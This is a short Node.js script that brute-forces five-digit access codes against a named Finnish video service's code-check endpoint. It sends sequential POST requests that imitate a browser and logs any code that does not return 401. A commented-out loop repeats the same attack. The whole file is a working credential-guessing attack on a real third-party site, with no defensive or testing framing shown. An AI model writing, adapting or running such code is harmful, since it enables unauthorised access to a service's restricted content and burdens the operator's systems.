const fetch = require('node-fetch');
const numeral = require("numeral")

function request (i) {
  const numero = numeral(i).format('00000')
  console.log(numero)

  fetch("https://hulluprinssi.videokanava.fi/api/code.php", {
    "headers": {
      "accept": "application/json",
      "accept-language": "fi-FI,fi;q=0.9,en-FI;q=0.8,en;q=0.7,en-US;q=0.6",
      "cache-control": "no-cache",
      "content-type": "multipart/form-data; boundary=----WebKitFormBoundary0qFM6ZSdBlWlBL6O",
      "pragma": "no-cache",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin"
    },
    "referrer": "https://hulluprinssi.videokanava.fi/",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": `------WebKitFormBoundary0qFM6ZSdBlWlBL6O\r\nContent-Disposition: form-data; name=\"code\"\r\n\r\n${numero}\r\n------WebKitFormBoundary0qFM6ZSdBlWlBL6O--\r\n`,
    "method": "POST",
    "mode": "cors"
  })
  .then(res => res.json())
  .then(json => {
    if (json.status !== 401) {
      console.log('[NYT LÖYTYYYY]', json.status, 'Koodi: ', i)
    }
    console.log(json.status, 'Koodi: ', i)
    request(i + 1)

  })
  .catch(err => {
    console.log(err)
    request(i + 1)
  })
}

request(1000)

// for (let i = 1; i < 5000; i++) {
  // const numero = numeral(i).format('00000')
  // console.log(i)

// fetch("https://hulluprinssi.videokanava.fi/api/code.php", {
//   "headers": {
//     "accept": "application/json",
//     "accept-language": "fi-FI,fi;q=0.9,en-FI;q=0.8,en;q=0.7,en-US;q=0.6",
//     "cache-control": "no-cache",
//     "content-type": "multipart/form-data; boundary=----WebKitFormBoundary0qFM6ZSdBlWlBL6O",
//     "pragma": "no-cache",
//     "sec-fetch-dest": "empty",
//     "sec-fetch-mode": "cors",
//     "sec-fetch-site": "same-origin"
//   },
//   "referrer": "https://hulluprinssi.videokanava.fi/",
//   "referrerPolicy": "strict-origin-when-cross-origin",
//   "body": "------WebKitFormBoundary0qFM6ZSdBlWlBL6O\r\nContent-Disposition: form-data; name=\"code\"\r\n\r\n00002\r\n------WebKitFormBoundary0qFM6ZSdBlWlBL6O--\r\n",
//   "method": "POST",
//   "mode": "cors"
// })
//   .then(res => res.json())
//   .then(json => {
//     if (json.status !== 401) {
//       console.log('[NYT LÖYTYYYY]', json.status, 'Koodi: ', i)
//     }
//     console.log(json.status, 'Koodi: ', i)
//   })
//   .catch(err => console.log(err))
// }
